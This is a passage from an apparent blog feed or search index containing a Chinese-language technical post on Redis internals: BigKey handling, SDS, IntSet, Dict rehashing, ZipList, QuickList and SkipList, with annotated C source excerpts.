            <tag> 栈 </tag>
            
            <tag> 队列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis 底层结构</title>
      <link href="/2022/11/26/Redis/Redis-%E5%BA%95%E5%B1%82%E7%BB%93%E6%9E%84/"/>
      <url>/2022/11/26/Redis/Redis-%E5%BA%95%E5%B1%82%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="BigKey"><a href="#BigKey" class="headerlink" title="BigKey"></a>BigKey</h2><h3 id="是什么-？"><a href="#是什么-？" class="headerlink" title="是什么 ？"></a>是什么 ？</h3><p>BigKey通常以Key的大小和Key中成员的数量来综合判定，例如：</p><ol><li>Key本身的数据量过大：一个String类型的Key，它的值为5 MB。</li><li>Key中的成员数过多：一个ZSET类型的Key，它的成员数量为10,000个。</li><li>Key中成员的数据量过大：一个Hash类型的Key，它的成员数量虽然只有1,000个但这些成员的Value（值）总大小为100 MB。</li></ol><p>推荐值：</p><ol><li>单个key的value小于10KB</li><li>对于集合类型的key，建议元素数量小于1000</li></ol><h3 id="有什么危害-？"><a href="#有什么危害-？" class="headerlink" title="有什么危害 ？"></a>有什么危害 ？</h3><ul><li>网络阻塞</li></ul><p>对BigKey执行读请求时，少量的QPS就可能导致带宽使用率被占满，导致Redis实例，乃至所在物理机变慢 </p><ul><li>数据倾斜</li></ul><p>BigKey所在的Redis实例内存使用率远超其他实例，无法使数据分片的内存资源达到均衡 </p><ul><li>Redis阻塞</li></ul><p>对元素较多的hash、list、zset等做运算会耗时较旧，使主线程被阻塞 </p><ul><li>CPU压力</li></ul><p>对BigKey的数据序列化和反序列化会导致CPU的使用率飙升，影响Redis实例和本机其它应用</p><h3 id="怎么识别-？"><a href="#怎么识别-？" class="headerlink" title="怎么识别 ？"></a>怎么识别 ？</h3><ul><li>redis-cli –bigkeys</li></ul><p>利用redis-cli提供的–bigkeys参数，可以遍历分析所有key，并返回Key的整体统计信息与每个数据的Top1的big key </p><ul><li>scan扫描</li></ul><p>自己编程，利用scan扫描Redis中的所有key，利用strlen、hlen等命令判断key的长度（此处不建议使用MEMORY USAGE） </p><ul><li>第三方工具</li></ul><p>利用第三方工具，如 Redis-Rdb-Tools 分析RDB快照文件，全面分析内存使用情况 </p><ul><li>网络监控</li></ul><p>自定义工具，监控进出Redis的网络数据，超出预警值时主动告警</p><h3 id="如何删除-？"><a href="#如何删除-？" class="headerlink" title="如何删除 ？"></a>如何删除 ？</h3><p>BigKey内存占用较多，即便时删除这样的key也需要耗费很长时间，导致Redis主线程阻塞，引发一系列问题。 </p><ul><li>redis 3.0 及以下版本</li></ul><p>如果是集合类型，则遍历BigKey的元素，先逐个删除子元素，最后删除BigKey </p><ul><li>Redis 4.0以后 </li></ul><p>Redis在4.0后提供了异步删除的命令：unlink</p><h2 id="底层数据结构"><a href="#底层数据结构" class="headerlink" title="底层数据结构"></a>底层数据结构</h2><h3 id="动态字符串SDS"><a href="#动态字符串SDS" class="headerlink" title="动态字符串SDS"></a>动态字符串SDS</h3><p>Redis并未使用C语言的字符串，因为存在一些问题：</p><ol><li>获取字符串长度需要运算</li><li>非二进制安全</li><li>不可修改</li></ol><p>因此Redis自己优化了字符串结构，为简单动态字符串（Simple Dynamic String），简称SDS。</p><p>我们在最初学习Redis时，会操作：<code>set key value</code>, 底层实际上创建了两个SDS，一个包含 key，一个包含 value。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8ib64ydeij30w00dtq5b.jpg" alt="image-20221126101355075"></p><p>​    我们看到它提到了动态字符串，那相应应该有动态扩容的能力，假如我们要给SDS追加一段字符串“,Amy”，这里首先会申请新内存空间：</p><ul><li>如果新字符串小于1M，则新空间为扩展后字符串长度的两倍+1；</li><li>如果新字符串大于1M，则新空间为扩展后字符串长度+1M+1。称为内存预分配。</li></ul><blockquote><p>优点：</p></blockquote><ol><li>获取字符串长度为 <code>O(1)</code></li><li>支持动态扩容</li><li>减少内存分配次数</li><li>二进制安全</li></ol><h3 id="IntSet"><a href="#IntSet" class="headerlink" title="IntSet"></a>IntSet</h3><p>IntSet 是Redis的Set结构的一种实现方式，基于<strong>整数数组</strong>来实现，并且<strong>长度可变</strong>，<strong>有序</strong>。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8ibaytj98j30qm0dfdia.jpg" alt="image-20221126101835593"></p><p>为了方便查找，本身按照整数进行<strong>升序存储</strong>保存到content[]内</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8ibeluzphj30vz0b5dgx.jpg" alt="image-20221126102206179"></p><p>假设最初存储元素：<code>&#123;5,10,20&#125;</code>采用的编码是INTSET_ENC_INT16，则每个整数占2字节。</p><p>我们向该其中添加一个数字：50000，这个数字超出了int16_t的范围，intset会自动升级编码方式到合适的大小。以当前案例来说流程如下：</p><ol><li><p>升级编码为INTSET_ENC_INT32, 每个整数占4字节，并按照新的编码方式及元素个数<strong>扩容数组</strong></p></li><li><p><strong>倒序</strong>依次将数组中的元素拷贝到扩容后的正确位置（倒序保证，之前节点不会被覆盖）</p></li></ol><h4 id="新增流程"><a href="#新增流程" class="headerlink" title="新增流程"></a>新增流程</h4><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">intset *intsetAdd(intset *<span class="keyword">is</span>, int64_t <span class="keyword">value</span>, uint8_t *success) &#123;</span><br><span class="line">    uint8_t valenc = _intsetValueEncoding(<span class="keyword">value</span>);<span class="comment">// 获取当前值编码</span></span><br><span class="line">    uint32_t pos; <span class="comment">// 要插入的位置</span></span><br><span class="line">    <span class="keyword">if</span> (success) *success = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 判断编码是不是超过了当前intset的编码</span></span><br><span class="line">    <span class="keyword">if</span> (valenc &gt; intrev32ifbe(<span class="keyword">is</span>-&gt;encoding)) &#123;</span><br><span class="line">        <span class="comment">// 超出编码，需要升级</span></span><br><span class="line">        <span class="keyword">return</span> intsetUpgradeAndAdd(<span class="keyword">is</span>,<span class="keyword">value</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 在当前intset中查找值与value一样的元素的角标pos</span></span><br><span class="line">        <span class="keyword">if</span> (intsetSearch(<span class="keyword">is</span>,<span class="keyword">value</span>,&amp;pos)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (success) *success = <span class="number">0</span>; <span class="comment">//如果找到了，则无需插入，直接结束并返回失败</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">is</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 数组扩容</span></span><br><span class="line">        <span class="keyword">is</span> = intsetResize(<span class="keyword">is</span>,intrev32ifbe(<span class="keyword">is</span>-&gt;length)+<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 移动数组中pos之后的元素到pos+1，给新元素腾出空间</span></span><br><span class="line">        <span class="keyword">if</span> (pos &lt; intrev32ifbe(<span class="keyword">is</span>-&gt;length)) intsetMoveTail(<span class="keyword">is</span>,pos,pos+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 插入新元素</span></span><br><span class="line">    _intsetSet(<span class="keyword">is</span>,pos,<span class="keyword">value</span>);</span><br><span class="line">    <span class="comment">// 重置元素长度</span></span><br><span class="line">    <span class="keyword">is</span>-&gt;length = intrev32ifbe(intrev32ifbe(<span class="keyword">is</span>-&gt;length)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">is</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="升级流程"><a href="#升级流程" class="headerlink" title="升级流程"></a>升级流程</h4><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> intset *intsetUpgradeAndAdd(intset *<span class="keyword">is</span>, int64_t <span class="keyword">value</span>) &#123;</span><br><span class="line">    <span class="comment">// 获取当前intset编码</span></span><br><span class="line">    uint8_t curenc = intrev32ifbe(<span class="keyword">is</span>-&gt;encoding);</span><br><span class="line">    <span class="comment">// 获取新编码</span></span><br><span class="line">    uint8_t newenc = _intsetValueEncoding(<span class="keyword">value</span>);</span><br><span class="line">    <span class="comment">// 获取元素个数</span></span><br><span class="line">    <span class="built_in">int</span> length = intrev32ifbe(<span class="keyword">is</span>-&gt;length); </span><br><span class="line">    <span class="comment">// 判断新元素是大于0还是小于0 ，小于0插入队首、大于0插入队尾</span></span><br><span class="line">    <span class="built_in">int</span> prepend = <span class="keyword">value</span> &lt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 重置编码为新编码</span></span><br><span class="line">    <span class="keyword">is</span>-&gt;encoding = intrev32ifbe(newenc);</span><br><span class="line">    <span class="comment">// 重置数组大小</span></span><br><span class="line">    <span class="keyword">is</span> = intsetResize(<span class="keyword">is</span>,intrev32ifbe(<span class="keyword">is</span>-&gt;length)+<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 倒序遍历，逐个搬运元素到新的位置，_intsetGetEncoded按照旧编码方式查找旧元素</span></span><br><span class="line">    <span class="keyword">while</span>(length--) <span class="comment">// _intsetSet按照新编码方式插入新元素</span></span><br><span class="line">        _intsetSet(<span class="keyword">is</span>,length+prepend,_intsetGetEncoded(<span class="keyword">is</span>,length,curenc));</span><br><span class="line">    <span class="comment">/* 插入新元素，prepend决定是队首还是队尾*/</span></span><br><span class="line">    <span class="keyword">if</span> (prepend)</span><br><span class="line">        _intsetSet(<span class="keyword">is</span>,<span class="number">0</span>,<span class="keyword">value</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        _intsetSet(<span class="keyword">is</span>,intrev32ifbe(<span class="keyword">is</span>-&gt;length),<span class="keyword">value</span>);</span><br><span class="line">    <span class="comment">// 修改数组长度</span></span><br><span class="line">    <span class="keyword">is</span>-&gt;length = intrev32ifbe(intrev32ifbe(<span class="keyword">is</span>-&gt;length)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">is</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>总结：</p></blockquote><ol><li>底层为<strong>整数数组</strong>，也就是一块儿完整的内存</li><li>内部元素，<strong>唯一</strong>，<strong>有序</strong>。</li><li>具备类型升级（<strong>倒序扩容</strong>）。</li><li>底层采用二分查找。（因为有序）</li></ol><h3 id="Dict"><a href="#Dict" class="headerlink" title="Dict"></a>Dict</h3><p>​    我们知道Redis中是Key-Value结构，在Java中类似的也有Map结构，能够快速的进行增删改查，底层一定是有关系的映射。Redis正是基于Dict实现的。</p><p>​    Dict有三个部分：哈希表（DictHashTable）、哈希节点（DictEntry）、字典（Dict）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">dictht</span> &#123;</span><br><span class="line">    <span class="comment">// entry数组</span></span><br><span class="line">    <span class="comment">// 数组中保存的是指向entry的指针</span></span><br><span class="line">    dictEntry **table; </span><br><span class="line">    <span class="comment">// 哈希表大小</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> size;     </span><br><span class="line">    <span class="comment">// 哈希表大小的掩码，总等于size - 1</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> sizemask;     </span><br><span class="line">    <span class="comment">// entry个数</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> used; </span><br><span class="line">&#125; dictht;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">dictEntry</span> &#123;</span><br><span class="line">    <span class="type">void</span> *key; <span class="comment">// 键</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="type">void</span> *val;</span><br><span class="line">        <span class="type">uint64_t</span> u64;</span><br><span class="line">        <span class="type">int64_t</span> s64;</span><br><span class="line">        <span class="type">double</span> d;</span><br><span class="line">    &#125; v; <span class="comment">// 值</span></span><br><span class="line">    <span class="comment">// 下一个Entry的指针</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">dictEntry</span> *next; </span><br><span class="line">&#125; dictEntry;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dict</span> &#123;</span></span><br><span class="line">    dictType *type; <span class="comment">// dict类型，内置不同的hash函数</span></span><br><span class="line">    <span class="type">void</span> *privdata;     <span class="comment">// 私有数据，在做特殊hash运算时用</span></span><br><span class="line">    dictht ht[<span class="number">2</span>]; <span class="comment">// 一个Dict包含两个哈希表，其中一个是当前数据，另一个一般是空，rehash时使用</span></span><br><span class="line">    <span class="type">long</span> rehashidx;   <span class="comment">// rehash的进度，-1表示未进行</span></span><br><span class="line">    <span class="type">int16_t</span> pauserehash; <span class="comment">// rehash是否暂停，1则暂停，0则继续</span></span><br><span class="line">&#125; dict;</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8ibpu0dwbj30vb0b8ab5.jpg" alt="image-20221126103253031"></p><p>​    我们可以看到Dict中有两个dictht，第一个负责存储值，第二个负责reHash。也就是当节点个数过多时，需要进行扩容，在Java的Map中，当数组中一个链表的长度大于8，就会进行数组扩容，否则查找遍历太慢。这里的原理是类似的。</p><p>​    dictht内部是dictEntry数组，dictEntry含有指向下一个节点的指针。</p><h4 id="Dict扩容"><a href="#Dict扩容" class="headerlink" title="Dict扩容"></a>Dict扩容</h4><p>​    这里还是有Java中Map举例，HashMap默认还有加载因子为0.75，也就是说不等我们把空间使用完，底层就会判断如果<code>当前节点数/容量数</code>大于0.75，会频繁导致Hash碰撞，并且链表长度太长，所以需要扩容。</p><p>​    Dict在每次新增键值对时都会检查负载因子（LoadFactor = used/size） ，满足以下两种情况时会触发哈希表扩容：</p><ul><li>哈希表的 LoadFactor &gt;= 1，并且服务器没有执行 BGSAVE 或者 BGREWRITEAOF 等后台进程；</li><li>哈希表的 LoadFactor &gt; 5 ；</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> _dictExpandIfNeeded(dict *d)&#123;</span><br><span class="line">    <span class="comment">// 如果正在rehash，则返回ok</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">dictIsRehashing</span>(d)) <span class="keyword">return</span> DICT_OK;    <span class="comment">// 如果哈希表为空，则初始化哈希表为默认大小：4</span></span><br><span class="line">    <span class="keyword">if</span> (d-&gt;ht[<span class="number">0</span>].size == <span class="number">0</span>) <span class="keyword">return</span> <span class="built_in">dictExpand</span>(d, DICT_HT_INITIAL_SIZE);</span><br><span class="line">    <span class="comment">// 当负载因子（used/size）达到1以上，并且当前没有进行bgrewrite等子进程操作</span></span><br><span class="line">    <span class="comment">// 或者负载因子超过5，则进行 dictExpand ，也就是扩容</span></span><br><span class="line">    <span class="keyword">if</span> (d-&gt;ht[<span class="number">0</span>].used &gt;= d-&gt;ht[<span class="number">0</span>].size &amp;&amp;</span><br><span class="line">        (dict_can_resize || d-&gt;ht[<span class="number">0</span>].used/d-&gt;ht[<span class="number">0</span>].size &gt; dict_force_resize_ratio)&#123;</span><br><span class="line">        <span class="comment">// 扩容大小为used + 1，底层会对扩容大小做判断，实际上找的是第一个大于等于 used+1 的 2^n</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">dictExpand</span>(d, d-&gt;ht[<span class="number">0</span>].used + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> DICT_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Dict收缩"><a href="#Dict收缩" class="headerlink" title="Dict收缩"></a>Dict收缩</h4><p>Dict除了扩容以外，每次删除元素时，也会对负载因子做检查，当LoadFactor &lt; 0.1 时，会做哈希表收缩：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// t_hash.c # hashTypeDeleted() </span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (dictDelete((dict*)o-&gt;ptr, field) == C_OK) &#123;</span><br><span class="line">    deleted = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 删除成功后，检查是否需要重置Dict大小，如果需要则调用dictResize重置    /* Always check if the dictionary needs a resize after a delete. */</span></span><br><span class="line">    <span class="keyword">if</span> (htNeedsResize(o-&gt;ptr)) dictResize(o-&gt;ptr);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="comment">// server.c 文件</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">htNeedsResize</span><span class="params">(dict *dict)</span> &#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> size, used;</span><br><span class="line">    <span class="comment">// 哈希表大小</span></span><br><span class="line">    size = dictSlots(dict);</span><br><span class="line">    <span class="comment">// entry数量</span></span><br><span class="line">    used = dictSize(dict);</span><br><span class="line">    <span class="comment">// size &gt; 4（哈希表初识大小）并且 负载因子低于0.1</span></span><br><span class="line">    <span class="keyword">return</span> (size &gt; DICT_HT_INITIAL_SIZE &amp;&amp; (used*<span class="number">100</span>/size &lt; HASHTABLE_MIN_FILL));</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="type">int</span> <span class="title function_">dictResize</span><span class="params">(dict *d)</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> minimal;</span><br><span class="line">    <span class="comment">// 如果正在做bgsave或bgrewriteof或rehash，则返回错误</span></span><br><span class="line">    <span class="keyword">if</span> (!dict_can_resize || dictIsRehashing(d)) </span><br><span class="line">        <span class="keyword">return</span> DICT_ERR;</span><br><span class="line">    <span class="comment">// 获取used，也就是entry个数</span></span><br><span class="line">    minimal = d-&gt;ht[<span class="number">0</span>].used;</span><br><span class="line">    <span class="comment">// 如果used小于4，则重置为4</span></span><br><span class="line">    <span class="keyword">if</span> (minimal &lt; DICT_HT_INITIAL_SIZE)</span><br><span class="line">        minimal = DICT_HT_INITIAL_SIZE;</span><br><span class="line">    <span class="comment">// 重置大小为minimal，其实是第一个大于等于minimal的2^n</span></span><br><span class="line">    <span class="keyword">return</span> dictExpand(d, minimal);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Dict的ReHash"><a href="#Dict的ReHash" class="headerlink" title="Dict的ReHash"></a>Dict的ReHash</h4><p>​    不管是扩容还是收缩，必定会创建新的哈希表，导致哈希表的size和sizemask变化，而key的查询与sizemask有关。因此必须对哈希表中的每一个key重新计算索引，插入新的哈希表，这个过程称为rehash。过程是这样的：</p><ol><li>计算新hash表的realeSize，值取决于当前要做的是扩容还是收缩：</li></ol><ul><li>如果是扩容，则新size为第一个大于等于dict.ht[0].used + 1的2^n</li><li>如果是收缩，则新size为第一个大于等于dict.ht[0].used的2^n （不得小于4）</li></ul><ol start="2"><li>按照新的realeSize申请内存空间，创建dictht，并赋值给dict.ht[1]</li><li>设置dict.rehashidx = 0，标示开始rehash</li><li>将dict.ht[0]中的每一个dictEntry都rehash到dict.ht[1]</li><li>将dict.ht[1]赋值给dict.ht[0]，给dict.ht[1]初始化为空哈希表，释放原来的dict.ht[0]的内存</li></ol><blockquote><p>如果Key中的节点过多，那一次性进行Rehash就有可能导致主线程阻塞，怎么解决？</p></blockquote><p>将dict.ht[1]赋值给dict.ht[0]，给dict.ht[1]初始化为空哈希表，释放原来的dict.ht[0]的内存</p><ol><li>计算新hash表的realeSize，值取决于当前要做的是扩容还是收缩：</li></ol><ul><li>如果是扩容，则新size为第一个大于等于dict.ht[0].used + 1的2^n</li><li>如果是收缩，则新size为第一个大于等于dict.ht[0].used的2^n （不得小于4）</li></ul><ol start="2"><li>按照新的size申请内存空间，创建dictht，并赋值给dict.ht[1]</li><li>设置dict.rehashidx = 0，标示开始rehash</li><li><strong>每次执行新增、查询、修改、删除操作时，都检查一下dict.rehashidx是否大于-1，如果是则将dict.ht[0].table[rehashidx]的entry链表rehash到dict.ht[1]，并且将rehashidx++。直至dict.ht[0]的所有数据都rehash到dict.ht[1]</strong></li><li>将dict.ht[1]赋值给dict.ht[0]，给dict.ht[1]初始化为空哈希表，释放原来的dict.ht[0]的内存</li><li>将rehashidx赋值为-1，代表rehash结束</li><li>在rehash过程中，新增操作，则直接写入ht[1]，查询、修改和删除则会在dict.ht[0]和dict.ht[1]依次查找并执行。这样可以确保ht[0]的数据只减不增，随着rehash最终为空</li></ol><blockquote><p>总结：</p></blockquote><p>Dict的结构：</p><ul><li>类似java的HashTable，底层是数组加链表来解决哈希冲突</li><li>Dict包含两个哈希表，ht[0]平常用，ht[1]用来rehash</li></ul><p>Dict的伸缩：</p><ul><li>当LoadFactor大于5或者LoadFactor大于1并且没有子进程任务时，Dict扩容</li><li>当LoadFactor小于0.1时，Dict收缩</li><li>扩容大小为第一个大于等于used + 1的2^n</li><li>收缩大小为第一个大于等于used 的2^nDict采用渐进式rehash，每次访问Dict时执行一次rehash</li><li>rehash时ht[0]只减不增，新增操作只在ht[1]执行，其它操作在两个哈希表</li></ul><h3 id="ZipList"><a href="#ZipList" class="headerlink" title="ZipList"></a>ZipList</h3><p>​    ZipList 是一种<strong>特殊的“双端链表”</strong> ，由一系列特殊编码的<strong>连续内存</strong>块组成。可以在<strong>任意一端进行压入/弹出</strong>操作, 并且该操作的时间复杂度为 **O(1)**。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8ic7og3jvj30tq0bw3ze.jpg" alt="image-20221126105002059"></p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8ic8fm1plj30rw09rta6.jpg" alt="image-20221126105045389"></p><p>​    ZipList说是特殊的来链表，但实际上并不是通过指针连接的，因为占用内存，所以Entry的结构是：</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8icayfrsdj30vb07o3zr.jpg" alt="image-20221126105310737"></p><p>​    因为是一块儿内存，每个节点记录了前一个节点的长度，就可以计算出各个节点的位置。</p><blockquote><p>这里有一个<strong>连锁更新</strong>（Cascade Update）的问题，但作者并未修改，因为发生的概率极低、</p></blockquote><p>​    假设我们有N个连续的、长度为250~253字节之间的entry，因此entry的previous_entry_length属性用1个字节即可表示，如图所示：</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8idymm1vij316e06dgmi.jpg" alt="image-20221126115032201"></p><p>​    现在在头位置插入一个新的节点，长度为254，则原先的头结点的<code>previous_entry_length</code>就会用5个字节来存储，那么该节点本身的长度就超过了254，则后续所有节点都必须更新。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8ie0zbr30j31ce06lgmo.jpg" alt="image-20221126115247739"></p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8ie1ey0jmj31c006qq42.jpg" alt="image-20221126115312608"></p><blockquote><p>总结：</p></blockquote><ol><li>压缩列表的可以看做一种<strong>连续内存</strong>空间的”双向链表”</li><li>列表的节点之间不是通过指针连接，而是记录上一节点和本节点<strong>长度来寻址</strong>，内存占用较低</li><li>如果列表数据过多，导致链表过长，可能影响查询性能</li><li>增或删较大数据时有可能发生<strong>连续更新</strong>问题</li></ol><h3 id="QuickList"><a href="#QuickList" class="headerlink" title="QuickList"></a>QuickList</h3><blockquote><p>​    上面我们学习了ZipList，虽然好操作，但因为是连续的空间，所以如果长度太长，也会影响效率，并且申请更多的连续空间，</p></blockquote><p>所以我们必须限制ZipList的长度和entry大小。</p><blockquote><p>如果ZipList超出上线怎么办？</p></blockquote><p>​    利用分片思想，形成多个ZipList，但分散后又不方便管理，则推出了：QuickList。它是一个双端链表，只不过链表中的每个节点都是一个ZipList。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8ie8o2laqj30xo07gt9k.jpg" alt="image-20221126120010880"></p><p>​    为了避免QuickList中的每个ZipList中entry过多，Redis提供了一个配置项：list-max-ziplist-size来限制。</p><ul><li>如果值为正，则代表ZipList的允许的entry个数的最大值</li><li>如果值为负，则代表ZipList的最大内存大小，分5种情况：<ul><li>-1：每个ZipList的内存占用不能超过4kb</li><li>-2：每个ZipList的内存占用不能超过8kb</li><li>-3：每个ZipList的内存占用不能超过16kb</li><li>-4：每个ZipList的内存占用不能超过32kb</li><li>-5：每个ZipList的内存占用不能超过64kb</li></ul></li></ul><p>默认值：<code>config get list-max-ziplist-size</code></p><p>​    除了控制ZipList的大小，QuickList还可以对节点的ZipList做<strong>压缩</strong>。通过配置项list-compress-depth来控制。因为链表一般都是从首尾访问较多，所以首尾是不压缩的。这个参数是控制首尾不压缩的节点个数：</p><ul><li>0：特殊值，代表不压缩</li><li>1：标示QuickList的首尾各有1个节点不压缩，中间节点压缩</li><li>2：标示QuickList的首尾各有2个节点不压缩，中间节点压缩</li><li>以此类推</li></ul><p>默认值：<code>config get list-compress-depth</code></p><blockquote><p>源码：</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8iecj8qewj30tk0budje.jpg" alt="image-20221126120353527"></p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8iecz7jujj30vy0eddhb.jpg" alt="image-20221126120419505"></p><blockquote><p>特点：</p></blockquote><ol><li>是一个节点为ZipList的双端链表</li><li>节点采用ZipList，解决了传统链表的内存占用问题</li><li>控制了ZipList大小，解决连续内存空间申请效率问题</li><li>中间节点可以压缩，进一步节省了内存</li></ol><h3 id="kipList"><a href="#kipList" class="headerlink" title="kipList"></a>kipList</h3><blockquote><p>​    原有链表的一个问题，就是查找元素时，需要一个个遍历，每个节点有一个指针指向下一个元素，那能不能多加几个指针？</p></blockquote><p>跳表的结构图：</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8iefh0xxjj30y80a3js9.jpg" alt="image-20221126120643605"></p><p>可以看到跳表的一个特性就是有序，如果无序，则多出来的指针没有意义。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8iehdfaioj31do0icgp2.jpg" alt="image-20221126120833282"></p><blockquote><p>总结：</p></blockquote><ol><li>跳跃表是一个双向链表，每个节点都包含score和ele值</li><li>节点按照score值排序，score值一样则按照ele字典排序</li><li>每个节点都可以包含多层指针，层数是1到32之间的随机数</li><li>不同层指针到下一个节点的跨度不同，层级越高，跨度越大</li><li>增删改查效率与红黑树基本一致，实现却更简单</li></ol><h3 id="RedisObject"><a href="#RedisObject" class="headerlink" title="RedisObject"></a>RedisObject</h3><p>Redis中的任意数据类型<code>(String,List,Set,Hash,ZSet)</code>都会被封装为RedisObject对象。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8iel9ffxvj30r508v765.jpg" alt="image-20221126121217400"></p><h4 id="底层编码方式"><a href="#底层编码方式" class="headerlink" 